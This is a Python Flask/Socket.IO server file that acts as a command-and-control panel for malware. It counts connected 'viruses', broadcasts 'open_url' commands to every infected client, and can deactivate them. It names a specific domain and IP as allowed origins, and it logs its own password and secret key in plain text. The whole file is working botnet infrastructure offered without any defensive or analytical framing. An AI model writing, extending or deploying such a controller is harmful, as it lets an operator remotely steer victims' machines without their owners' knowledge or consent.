import eventlet#
eventlet.monkey_patch()
import os
import logging
from flask import Flask, render_template, session, request
from flask import url_for, redirect, flash
from flask_socketio import SocketIO, emit

PASSWORD = os.getenv('PASSWORD')
QUANTITY_OF_VIRUSES = 0 

class Conf:
    SECRET_KEY = os.getenv('SECRET_KEY')
    #SESSION_COOKIE_SECURE = True
    DEBUG = True


app = Flask(__name__)
app.config.from_object(Conf)
sio = SocketIO(app, 
	cors_allowed_origins=['http://localhost:5000', 'http://debik.pp.ua', 'https://debik.pp.ua', 'http://45.83.193.140', 'https://45.83.193.140'],
	engineio_logger=True)

gunicorn_error_logger = logging.getLogger('gunicorn.error')
app.logger.handlers.extend(gunicorn_error_logger.handlers)
app.logger.setLevel(logging.DEBUG)
app.logger.debug('this will show in the log')
app.logger.debug(f'PASSWORD: {PASSWORD}')

all_sids = set()
viruses_sids = set()

@app.route('/test')
def test():
	return render_template('test.html')
@app.route('/', methods=["GET", "POST"])
def index():
    if request.method == "POST":
        password = request.form['password']
        if password == PASSWORD:
            session['is_passed'] = True
            print(session['is_passed'])
            return redirect(url_for('get_control_panel'))
        flash('Password is incorrect')

    return render_template('index.html')

@app.route('/control-panel/')
def get_control_panel():
    if 'is_passed' in session:
        if session['is_passed'] == True:
            return render_template('control_panel.html')
    return redirect(url_for('index'))

@sio.on('request_quantity')
def give_quantity():
    global QUANTITY_OF_VIRUSES
    emit('get_quantity_of_viruses', { 'quantity' : QUANTITY_OF_VIRUSES }, broadcast=True)

@sio.on('virus_connected')
def virus_connected():
    global QUANTITY_OF_VIRUSES
    QUANTITY_OF_VIRUSES += 1
    viruses_sids.add(request.sid)
    print('VIRUS CONNECTED')
    emit('get_quantity_of_viruses', { 'quantity' : QUANTITY_OF_VIRUSES }, broadcast=True)

@sio.on('message')
def handle_message(url):
    print(f'url : {url}')
    emit('open_url',{'url':url}, broadcast=True)#

@sio.on('deactivate')
def deactivate():
    print('Deactivaing each virus')
    emit('deactivate',broadcast=True)#

@sio.on('confirm_deactivate')
def confirm_deactivate():
    global QUANTITY_OF_VIRUSES
    QUANTITY_OF_VIRUSES -= 1
    viruses_sids.remove(request.sid)
    all_sids.remove(request.sid)
    print('VIRUS DISCONNECTED')
    emit('finish_deactivating')
    emit('get_quantity_of_viruses', { 'quantity' : QUANTITY_OF_VIRUSES }, broadcast=True)

@sio.on('connect')
def connect():
    all_sids.add(request.sid)
    app.logger.debug('CONNECTED')

@sio.on('disconnect')
def disconnect():
    if request.sid in viruses_sids:
        viruses_sids.remove(request.sid)
        global QUANTITY_OF_VIRUSES
        QUANTITY_OF_VIRUSES -= 1
        print('VIRUS DISCONNECTED')
        emit('get_quantity_of_viruses', { 'quantity' : QUANTITY_OF_VIRUSES }, broadcast=True)
    
    all_sids.remove(request.sid)


if __name__ == "__main__":
    print(f"[SECRET_KEY] :: {app.config['SECRET_KEY']}")
    print(f"[PASSWORD] :: {PASSWORD}")
    sio.run(app, debug=True)
